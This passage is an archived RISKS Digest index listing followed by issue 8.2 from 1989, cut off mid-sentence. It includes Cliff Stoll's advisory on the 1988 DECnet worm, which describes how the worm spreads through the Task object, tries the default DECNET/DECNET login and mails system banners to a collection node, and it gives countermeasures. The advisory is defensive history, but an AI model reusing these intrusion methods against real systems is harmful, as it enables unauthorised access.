</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.79.html">Volume 9 Issue 79 (9 Apr 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.79.html#subj1">  Fixing Computer Error Cost $1,300 in Overtime (Chris McDonald)</A>
<LI><A HREF="/Risks/9.79.html#subj2">  Computer problem delays Calif. Lotto payouts (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.79.html#subj3">  Computer Glitch Cuts of Decco Sales (Mark Adams)</A>
<LI><A HREF="/Risks/9.79.html#subj4">  Computer Animations in court testimony (Peter Scott)</A>
<LI><A HREF="/Risks/9.79.html#subj5">  Re: Proposed UK Authority for Risk Management (Dan Franklin)</A>
<LI><A HREF="/Risks/9.79.html#subj6">  Re: Intruders arrested (Mike McBain via Lee Naish)</A>
<LI><A HREF="/Risks/9.79.html#subj7">  Re: More on Prodigy's Updating of a User's Disks (Leonard Erickson)</A>
<LI><A HREF="/Risks/9.79.html#subj8">  Wonderfully mistaken letter generators (Frank Letts, Gary Cattarin)</A>
<LI><A HREF="/Risks/9.79.html#subj9">  Re: Automated Fast Food (Webber)</A>
<LI><A HREF="/Risks/9.79.html#subj10">  Re: Airbus Crash: Reports from the Indian Press (Dan Brahme)</A>
<LI><A HREF="/Risks/9.79.html#subj11">  A320 press excerpts (Robert Dorsett)</A>
<LI><A HREF="/Risks/9.79.html#subj12">  Indian A320 crash (Henry Spencer)</A>
<LI><A HREF="/Risks/9.79.html#subj13">  The two A320 crashes show similarities (Martyn Thomas)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.80.html">Volume 9 Issue 80 (13 Apr 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.80.html#subj1">  Risks of Daylight Savings Time (Chuck Weinstock)</A>
<LI><A HREF="/Risks/9.80.html#subj2">  Authentication via User-Defined Fields (Jim Kimble)</A>
<LI><A HREF="/Risks/9.80.html#subj3">  Rites of consumption (Phil Agre)</A>
<LI><A HREF="/Risks/9.80.html#subj4">  Franklin Resources Computer Glitch (John Murray)</A>
<LI><A HREF="/Risks/9.80.html#subj5">  Risks of computerized publishing (Henry Spencer)</A>
<LI><A HREF="/Risks/9.80.html#subj6">  Re: Computer generated letters (Benjamin Ellsworth, Nathaniel Borenstein)</A>
<LI><A HREF="/Risks/9.80.html#subj7">  Software: A320 vs. shuttle (Michael)</A>
<LI><A HREF="/Risks/9.80.html#subj8">  The C3 legacy, Part 5: Subsystem I (Les Earnest)</A>
<LI><A HREF="/Risks/9.80.html#subj9">  COMPASS 90 program and registration information (John Cherniavsky)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.81.html">Volume 9 Issue 81 (18 Apr 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.81.html#subj1">  RISKS, SENDMAIL, and YOU! (PGN)</A>
<LI><A HREF="/Risks/9.81.html#subj2">  London Tube train leaves ... without its driver (Stephen Page)</A>
<LI><A HREF="/Risks/9.81.html#subj3">  Shuttle roll incident on January '90 mission (Henry Spencer)</A>
<LI><A HREF="/Risks/9.81.html#subj4">  Software failures on Boeing 747-400? (Trevor Warwick)</A>
<LI><A HREF="/Risks/9.81.html#subj5">  False 1099 forms (Phil R. Karn)</A>
<LI><A HREF="/Risks/9.81.html#subj6">  Re: Risks [9.080] of Daylight Savings Time     (Thomas Zmudzinski, Chuck Weinstock)
</A>
<LI><A HREF="/Risks/9.81.html#subj7">  Comment on UK Software Standards (Richard Morton) [RISKS-9.1 and 2]</A>
<LI><A HREF="/Risks/9.81.html#subj8">  Automates Fast Food (David Bank)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.82.html">Volume 9 Issue 82 (20 Apr 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.82.html#subj1">  A320 news (Henry Spencer)</A>
<LI><A HREF="/Risks/9.82.html#subj2">  The Danger of Airbags (Jeff Deifik)</A>
<LI><A HREF="/Risks/9.82.html#subj3">  Re: Risks of computerized publishing (Paolo Mattiangeli)</A>
<LI><A HREF="/Risks/9.82.html#subj4">  Postal Employees and cross-matching (Brinton Cooper)</A>
<LI><A HREF="/Risks/9.82.html#subj5">  "It's a Computer Error" (Lindsay F. Marshall)</A>
<LI><A HREF="/Risks/9.82.html#subj6">  Re: London Tube Train (Clive Feather, anonymous)</A>
<LI><A HREF="/Risks/9.82.html#subj7">  Virus outbreak in China! (R.Gowans via MCGDRKG in Virus-L)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.83.html">Volume 9 Issue 83 (25 Apr 1990   )</A>
<DD><UL>
<LI><A HREF="/Risks/9.83.html#subj1">  You think YOU have problems with your telephone company? (PGN)</A>
<LI><A HREF="/Risks/9.83.html#subj2">  Traffic light outages (King Ables)</A>
<LI><A HREF="/Risks/9.83.html#subj3">  Sabbath Goes High-Tech (David Dabney)</A>
<LI><A HREF="/Risks/9.83.html#subj4">  Computers and Hyphenated names (Allan Meers)</A>
<LI><A HREF="/Risks/9.83.html#subj5">  London tube train and the Boeing 747 ... (Clive Walmsley)</A>
<LI><A HREF="/Risks/9.83.html#subj6">  Risky McDonald's comrade... (David Gursky)</A>
<LI><A HREF="/Risks/9.83.html#subj7">  Risks of engine computers and EMP (Lynn R Grant)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.84.html">Volume 9 Issue 84 (26 Apr 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.84.html#subj1">  Re: You think YOU have problems with your telephone company?     (Gary Chapman, David G. Novick, Vincent, Laura Halliday, 
    Al Stangenberger, Pete McVay, John Higdon, Greeny)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.85.html">Volume 9 Issue 85 (27 Apr 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.85.html#subj1">  Computer error parks hundreds illegally (Dave Harding)</A>
<LI><A HREF="/Risks/9.85.html#subj2">  Computers may be fattening? (Gary Tom)</A>
<LI><A HREF="/Risks/9.85.html#subj3">  Unattended Plane Take-off (Andrew Duane)</A>
<LI><A HREF="/Risks/9.85.html#subj4">  Aircraft electronics problems: A pilot's report (Peter Ilieve)</A>
<LI><A HREF="/Risks/9.85.html#subj5">  1099 forms, risks, and technology (Gregg TeHennepe)</A>
<LI><A HREF="/Risks/9.85.html#subj6">  Re: "It's a Computer Error" (Pete Mellor)</A>
<LI><A HREF="/Risks/9.85.html#subj7">  Re: Risks of engine computers and EMP (David Paul Hoyt)</A>
<LI><A HREF="/Risks/9.85.html#subj8">  Security Breach--cc:Mail Inc. (Chris McDonald)</A>
<LI><A HREF="/Risks/9.85.html#subj9">  Queues and Servers (Anthony E. Siegman)</A>
<LI><A HREF="/Risks/9.85.html#subj10">  Computers and names with special characters (Lance Hoffman)</A>
<LI><A HREF="/Risks/9.85.html#subj11">  Computer Jammming of 911 LInes (Gary McClelland)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.86.html">Volume 9 Issue 86 (30 April 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.86.html#subj1">  Futures market shut down (Steve Bellovin)</A>
<LI><A HREF="/Risks/9.86.html#subj2">  Habsheim A320 crash (Clive Feather)</A>
<LI><A HREF="/Risks/9.86.html#subj3">  Throttle Hitch Hits 747-400 (Robert Dorsett)</A>
<LI><A HREF="/Risks/9.86.html#subj4">  Re: Unattended Plane Take-off (Jan I Wolitzky)</A>
<LI><A HREF="/Risks/9.86.html#subj5">  Re: Computers and names with special characters (Mike Van Pelt)</A>
<LI><A HREF="/Risks/9.86.html#subj6">  Inadequate documentation - truncated GPAs (Doug Sewell)</A>
<LI><A HREF="/Risks/9.86.html#subj7">  "The return of the hacker" (David B. Benson)</A>
<LI><A HREF="/Risks/9.86.html#subj8">  Indian Professors Teaching Virus Writing (Cliff Stoll)</A>
<LI><A HREF="/Risks/9.86.html#subj9">  (Not necessarily) computer parks hundreds of cars illegally (Bill Gunshannon)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.87.html">Volume 9 Issue 87 (1 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.87.html#subj1">  Phones &amp; techologically illiterate operators (David A. Honig)</A>
<LI><A HREF="/Risks/9.87.html#subj2">  More telephone problems -- union pressures (Peter Jones)</A>
<LI><A HREF="/Risks/9.87.html#subj3">  Forwarding: Weird phone bills - an unexplored possibility    (Chaz Heritage via Richard Busch)
</A>
<LI><A HREF="/Risks/9.87.html#subj4">  Re: Call Forwarding (Peter Jones)</A>
<LI><A HREF="/Risks/9.87.html#subj5">  Kissimmee Kate (Geoffrey H. Cooper)</A>
<LI><A HREF="/Risks/9.87.html#subj6">  Re: You think YOU have problems with your telephone company?    (Gary Cattarin, Jozsef A Toth, Warren Levy)
</A>
<LI><A HREF="/Risks/9.87.html#subj7">  Blaming it on the computer? (Brad Templeton)</A>
<LI><A HREF="/Risks/9.87.html#subj8">  Re: Risky McDonald's comrade... (Charles Youman)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.88.html">Volume 9 Issue 88 (2 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.88.html#subj1">  Booby-trapped contracted software (Tom Kopp)</A>
<LI><A HREF="/Risks/9.88.html#subj2">  Death rate inflated in St. Bruno area, health report finds (David Sherman)</A>
<LI><A HREF="/Risks/9.88.html#subj3">  Software Bug Causes Shuttle Countdown Hold at T-31 Seconds (Karl Lehenbauer)</A>
<LI><A HREF="/Risks/9.88.html#subj4">  Criticism of "Glass Cockpits" (1) and (2) (Martyn Thomas)</A>
<LI><A HREF="/Risks/9.88.html#subj5">  A320 Bangalore crash (Martyn Thomas)</A>
<LI><A HREF="/Risks/9.88.html#subj6">  A320 criticisms reported (Martyn Thomas)</A>
<LI><A HREF="/Risks/9.88.html#subj7">  Re: computer parks hundreds of cars illegally (Andrew E. Birner)</A>
<LI><A HREF="/Risks/9.88.html#subj8">  (Apparently) widespread problem with census 800 number (Timothy M. Wright)</A>
<LI><A HREF="/Risks/9.88.html#subj9">  Re: You think YOU have problems with your telephone company? (Chris Lewis)</A>
<LI><A HREF="/Risks/9.88.html#subj10">  Telephone switch problems (Webber)</A>
<LI><A HREF="/Risks/9.88.html#subj11">  White paper available: "Improving the Security of Your UNIX System"    (Davy Curry)
</A>
<LI><A HREF="/Risks/9.88.html#subj12">  Virus found in a game software on the market (Yoshio Oyanagi)</A>
<LI><A HREF="/Risks/9.88.html#subj13">  Re: Computers and names with special characters (Bandy)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.89.html">Volume 9 Issue 89 (7 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.89.html#subj1">  A funny thing happened at the lottery office (Alan Hargreaves)</A>
<LI><A HREF="/Risks/9.89.html#subj2">  `Boy, 12, allegedly taps credit files' (Ira Greenberg)</A>
<LI><A HREF="/Risks/9.89.html#subj3">  Robert T. Morris' sentencing (PGN)</A>
<LI><A HREF="/Risks/9.89.html#subj4">  Hazards Of Office Laser Printers (Keith Dancey)</A>
<LI><A HREF="/Risks/9.89.html#subj5">  Re: Aircraft electronics problems PIREP (Steve Jay, Robert Dorsett)</A>
<LI><A HREF="/Risks/9.89.html#subj6">  Re: A320 criticisms reported (Robert Dorsett)</A>
<LI><A HREF="/Risks/9.89.html#subj7">  Phone system problems (Gail L Barlich, Steve Bellovin, Andras)</A>
<LI><A HREF="/Risks/9.89.html#subj8">  Phone Switch Resets (Avi Belinsky)</A>
<LI><A HREF="/Risks/9.89.html#subj9">  Other ways to get "Improving the Security of Your UNIX System" (Davy Curry)</A>
<LI><A HREF="/Risks/9.89.html#subj10">  So many weapons, so little radio spectrum (Chuq Von Rospach)</A>
<LI><A HREF="/Risks/9.89.html#subj11">  Und der Hyphisch (Andy Behrens)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.90.html">Volume 9 Issue 90 (10 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.90.html#subj1">  The Mayor and the EMail (John Markoff)</A>
<LI><A HREF="/Risks/9.90.html#subj2">  Democratic bug in AppleLink! (Hector Rojas)</A>
<LI><A HREF="/Risks/9.90.html#subj3">  `Hacker' alters phone services (David G. Novick)</A>
<LI><A HREF="/Risks/9.90.html#subj4">  Re: A funny thing happened at the lottery office (Mike Beede, Emmett Hogan)</A>
<LI><A HREF="/Risks/9.90.html#subj5">  Risk of Unauthorized Access to TRW Credit Database (Larry Lippman)</A>
<LI><A HREF="/Risks/9.90.html#subj6">  Unusual traffic light behaviour (Andy Coombes)</A>
<LI><A HREF="/Risks/9.90.html#subj7">  High School Boy's Story was a Fake (Yoshio Oyanagi)</A>
<LI><A HREF="/Risks/9.90.html#subj8">  More about Sharp's Viri in Japan (Yoshio Oyanagi)</A>
<LI><A HREF="/Risks/9.90.html#subj9">  ARMY wants computer viruses for battlefield use (Gary McClelland)</A>
<LI><A HREF="/Risks/9.90.html#subj10">  A-320 avionics malfunctions (Vic Riley)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.91.html">Volume 9 Issue 91 (13 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.91.html#subj1">  Hubble Telescope pointing in the wrong direction (Raymond Chen)</A>
<LI><A HREF="/Risks/9.91.html#subj2">  "Feds Pull Plug On Hackers" (James K. Huggins)</A>
<LI><A HREF="/Risks/9.91.html#subj3">  Airline booking cancellation (Pete Mellor)</A>
<LI><A HREF="/Risks/9.91.html#subj4">  Simple tone dialler bypasses British Telecom charging (Nigel Roberts)</A>
<LI><A HREF="/Risks/9.91.html#subj5">  Risks of caller identification (David A. Honig)</A>
<LI><A HREF="/Risks/9.91.html#subj6">  Avoiding ANI by Dialing 1-900 (Gary McClelland)</A>
<LI><A HREF="/Risks/9.91.html#subj7">  Duplicate Mailings of RISKS 9.89 -- BITNET (Emmett Hogan)</A>
<LI><A HREF="/Risks/9.91.html#subj8">  Re: Hazards of laser printers (Paul DuBois, Peter Jones)</A>
<LI><A HREF="/Risks/9.91.html#subj9">  IFIP Conference Call for Papers (Rick Schlichting)</A>
<LI><A HREF="/Risks/9.91.html#subj10">  CALL FOR PAPERS: Computing and Ethics (Donald Gotterbarn)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.92.html">Volume 9 Issue 92 (17 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.92.html#subj1">  Army chafes under Congress' robot weapons ban (Jon Jacky)</A>
<LI><A HREF="/Risks/9.92.html#subj2">  Re: [London] Tube train leaves ... without its driver (Gavin Oddy)</A>
<LI><A HREF="/Risks/9.92.html#subj3">  Re: First Hubble Images Delayed To Conduct Focusing Tests (Karl Lehenbauer)</A>
<LI><A HREF="/Risks/9.92.html#subj4">  ANI for the criminal as well as the private citizen (Brad Templeton)</A>
<LI><A HREF="/Risks/9.92.html#subj5">  Computer Virus Solicitation (Andy Warinner)</A>
<LI><A HREF="/Risks/9.92.html#subj6">  Feds Pull Plug On Hackers (Bob Sutterfield, Rick Clark)</A>
<LI><A HREF="/Risks/9.92.html#subj7">  Re: Military Viruses (Jim Vavrina via David Brierley)</A>
<LI><A HREF="/Risks/9.92.html#subj8">  Re: Magnetic ID cards for all Israeli citizens (Amos Shapir)</A>
<LI><A HREF="/Risks/9.92.html#subj9">  Risks of Laser Printouts (David Tarabar)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.93.html">Volume 9 Issue 93 (21 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.93.html#subj1">  Stamford CT 18-hour telephone switch outage affects 27,000 lines (PGN)</A>
<LI><A HREF="/Risks/9.93.html#subj2">  Irrational and nonvaledictory reasoning (PGN)</A>
<LI><A HREF="/Risks/9.93.html#subj3">  Crackdown on 1-900-STOPPER? (John M. Sulak)</A>
<LI><A HREF="/Risks/9.93.html#subj4">  P.T.U.U.I. (Robert Hardy, PGN)</A>
<LI><A HREF="/Risks/9.93.html#subj5">  Military Computer Virus Contract (Rory J. O'Connor)</A>
<LI><A HREF="/Risks/9.93.html#subj6">  Risks of Laser Printouts (Simson L. Garfinkel)</A>
<LI><A HREF="/Risks/9.93.html#subj7">  Directions and Implications of Advanced Computing, DIAC-90 (Rodney Hoffman)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.94.html">Volume 9 Issue 94 (25 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.94.html#subj1">  More on Stamford CT Telephone Switch Outage (PGN) </A>
<LI><A HREF="/Risks/9.94.html#subj2">  Duplicate RISKS mailings...SOLVED! (Emmett Hogan)</A>
<LI><A HREF="/Risks/9.94.html#subj3">  Cross about CRIS (Crime Report information System) (Pete Mellor)</A>
<LI><A HREF="/Risks/9.94.html#subj4">  Disk failures after extended shutdown (David Keppel)</A>
<LI><A HREF="/Risks/9.94.html#subj5">  The Internet is growing up! (Scott Deerwester)</A>
<LI><A HREF="/Risks/9.94.html#subj6">  Are government secrets safer if not classified? (Mary Culnan)</A>
<LI><A HREF="/Risks/9.94.html#subj7">  Risks of slandering ... in public forums [re: P.T.U.U.I.] (Tom Blinn)</A>
<LI><A HREF="/Risks/9.94.html#subj8">  A320 again (Nancy Leveson)</A>
<LI><A HREF="/Risks/9.94.html#subj9">  M1 Air Crash Inquest (Brian Randell)</A>
<LI><A HREF="/Risks/9.94.html#subj10">  Tempus Fugit -- Claremont Clock Tower Tick Talk (Brian Randell)</A>
<LI><A HREF="/Risks/9.94.html#subj11">  Telephone network synchronization and NavSat     (John T. Mulqueen via James Price Salsman via JC%RMC)
</A>
<LI><A HREF="/Risks/9.94.html#subj12">  National Geographic also wants me to move (Tim Kay)</A>
<LI><A HREF="/Risks/9.94.html#subj13">  Re: Irrational and nonvaledictory reasoning (John Chew)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.95.html">Volume 9 Issue 95 (26 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.95.html#subj1">  Possible Anti-Virus Legislation    (Robert Smithmidford via Thomas Zmudzinski via Linda K. Perez)
</A>
<LI><A HREF="/Risks/9.95.html#subj2">  Secure UNIX Infected? (Craig Harmer via Russ Davis via Linda K. Perez)</A>
<LI><A HREF="/Risks/9.95.html#subj3">  Follow-up on Fed Raids on Hackers (David Ruderman)</A>
<LI><A HREF="/Risks/9.95.html#subj4">  Crypto '90 conference, 11-15 August 1990, UC Santa Barbara (John Gilmore)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.96.html">Volume 9 Issue 96 (29 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.96.html#subj1">  Roller Coaster Accident Blamed on Computer (Gary Wright)</A>
<LI><A HREF="/Risks/9.96.html#subj2">  ATMs robbed with no signs of tampering (Stephen W Thompson)</A>
<LI><A HREF="/Risks/9.96.html#subj3">  Bank deposits huge amount in account and blames owner! (Richard Muirden)</A>
<LI><A HREF="/Risks/9.96.html#subj4">  Risks in secure documents (David Fuller)</A>
<LI><A HREF="/Risks/9.96.html#subj5">  You Think YOU Have Trouble with Your Telephone Company? (Donald B. Wechsler)</A>
<LI><A HREF="/Risks/9.96.html#subj6">  Steve Jackson Games &amp; A.B. 3280 (Brian Sherwood)</A>
<LI><A HREF="/Risks/9.96.html#subj7">  Re: Secure UNIX Infected? (Steve Bellovin, Henry Spencer)</A>
<LI><A HREF="/Risks/9.96.html#subj8">  Dereferencing Tim Kay's address (David Kuder)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.97.html">Volume 9 Issue 97 (30 May 1990)</A>
<DD><UL>
<LI><A HREF="/Risks/9.97.html#subj1">  The C3 Legacy, Part 6: Feedback (Les Earnest)</A>
<LI><A HREF="/Risks/9.97.html#subj2">  Re: You Think YOU Have Trouble with Your Telephone Company? (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.97.html#subj3">  Right to Privacy, Public Funds, and the 2600 (Bob Estell)</A>
<LI><A HREF="/Risks/9.97.html#subj4">  Re: Steve Jackson Games &amp; A.B. 3280 (Chuq Von Rosbach)</A>
<LI><A HREF="/Risks/9.97.html#subj5">  Re: ATMs robbed with no signs of tampering (Bob Campbell)</A>
<LI><A HREF="/Risks/9.97.html#subj6">  Re: ATMs robbed in Trump Castle (Avi Belinsky)</A>
<LI><A HREF="/Risks/9.97.html#subj7">  Re: Secure UNIX Infected? (Mark Gabriele)</A>
</UL></DL>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8/index.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Volume" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/10/index.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Volume" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-52</DOCNO>
<DOCOLDNO>IA012-000131-B036-317</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.2.html 128.240.150.127 19970217024731 text/html 22053
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:45:59 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 2</TITLE>
<LINK REL="Prev" HREF="/Risks/8.01.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.03.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.01.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.03.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 2</H1>
<H2> Wednesday 4 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Christmas 1988 Decnet Worm -- Counteracted 
</A>
<DD>
<A HREF="#subj1.1">
Cliff Stoll
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Vincennes and the computer 
</A>
<DD>
<A HREF="#subj2.1">
Steve Philipson
</A><br>
<A HREF="#subj2.2">
 Clifford Johnson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Viruses and System Security (a story) 
</A>
<DD>
<A HREF="#subj3.1">
by Dave Platt
</A><br>
<A HREF="#subj3.2">
    submitted to RISKS from rec.humor.funny by Jim Horning and Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Stallman, Minsky and Drescher on the Internet Worm 
</A>
<DD>
<A HREF="#subj4.1">
via Martin Minow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  FAA Orders Computer Card Security Systems at 270 Airports 
</A>
<DD>
<A HREF="#subj5.1">
Henry Mensch
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Christmas 1988 Decnet Worm -- Counteracted
</A>
</H3>
<address>
Cliff Stoll
&lt;<A HREF="mailto:cliff%cfa204@harvard.harvard.edu ">
cliff%cfa204@harvard.harvard.edu 
</A>&gt;
</address>
<i>
Tue, 27 Dec 88 13:44:27 EST
</i><PRE>

On December 22nd, someone started a virus/worm on the SPAN/Decnet network.
It attacks only Vax/VMS computers, and only those which are connected 
to the SPAN/HEPNET/Decnet network.  It cannot enter Unix systems or PC's.

This virus/worm is benign in that it does not erase information.  The writer 
apparently wishes to embarrass system managers and network administrators.

Language purists will call it a worm:  it does not modify any files,
and copies itself from node to node.

Indications point to an origin in Germany.

I spent several hours creating bogus announcements to confuse and counteract 
the virus writer.  I've mailed these to the PHSOLIDE collection point.

The virus writer has collected these announcements, and has no way
to tell which announcements are valid, and which are phoney. 


Technical details for Decnet/VMS people:

The worm enters through the Decnet Task object, and mails your system's
announcement banner (sys$announce) to Decnet node 20597::PHSOLIDE.
(This node apparently is in France)

The worm generates a random node address and tries to copy itself onto that
node.  If this fails, it tries different random nodes until it finds one.
Once it finds a valid node, it tries to copy itself using the NETFAL account
(through the Task object).  If you don't have a valid Task object, it tries
to log into account DECNET, with password DECNET.

Once it's in your system, it creates a list of all users on your node, and
mails a message to each of them.  This message is some blather about how
Father Christmas has had a hard time getting "the terrible Rambo-Guns, Tanks
and Space Ships up here at the Northpole." The message itself is written in
a stilted, almost Germanic, style.

You can immunize your system by deleting the TASK 0 Decnet object, and by
making certain that you've changed the Decnet password.  In any case, the
worm is timed to stop after December 24th.  By the time you receive this
message, the worm will have died.

Cliff Stoll, Harvard - Smithsonian Center for Astrophysics,
60 Garden Street, Cambridge, MA 02138         Cliff@cfa200.harvard.edu

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Vincennes and the computer
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Fri, 23 Dec 88 15:03:50 PST
</i><PRE>

In RISKS-FORUM Digest 7.94 "Clifford Johnson" &lt;GA.CJJ@Forsythe.Stanford.EDU&gt;
[Vincennes:  conclusively, a computer-related error] writes:

&gt;I reflect that *all* the information that panicked the Vincennes crew and
&gt;captain came from the computers.  The captain was not faulted [...]
&gt; The fault was found to lie largely with the computer's initial
&gt;classification of the flight as hostile, and the computers' subsequent unclear
&gt;albeit correct presentation of the ascent data.  The actions taken to remedy
&gt;the deficiencies are improvements in the computer display/ human interface.
&gt;This is a a classic case of computer *related* error: unobvious and secondary
&gt;display of criticial data.

&gt;What the Pentagon has has more or less overtly ruled is that its
&gt;most competent, trained, and alert officers cannot be blamed for
&gt;mistakenly reading and acting on deadly computer displays,
&gt;especially not in combat, i.e. when they're actually used.

   In the case of Vincennes, the computer was definitely NOT the only nor
the most significant source of information.  The ship had been primed with
intelligence reports of hostile intent, was engaged in battle, maneuvering
radically, and taking fire.  The crew could hear bullets and shrapnel hitting
the ship.  They had been briefed to expect attack including aerial attack,
and had the memory of the Stark to remind them of the dangers inherent in
their situation.  They knew they were under surface attack.  They were
ready to believe that they were about to come under aerial attack as well.

   A major conclusion of the report was that people under great stress do 
not function in the same manner as they do in lab conditions.  It's easy 
for us to scour through the records in the comfort of our homes and offices 
and make judgements, but far more difficult to make them under severe time 
pressure, in physically disturbing conditions, under the threat of death.

   This case illustrated that a correct presentation of data is not always 
sufficient to prevent error; it may be necessary to present the data 
correctly and in a form that is highly unlikely to be misinterpreted.  It 
is not clear that we will ever be able to make systems that are immune 
from misinterpretation under such severe conditions.

   There is always confusion in battle, and there always will be, no 
matter what we do with computer systems.  The commander's first duty was 
to protect his ship.  That is what he did, albeit from what turned out to 
be a non-combatant that could not have hurt him.  To censure the crew of 
the Vincennes would undermine the ability of every man in uniform to take 
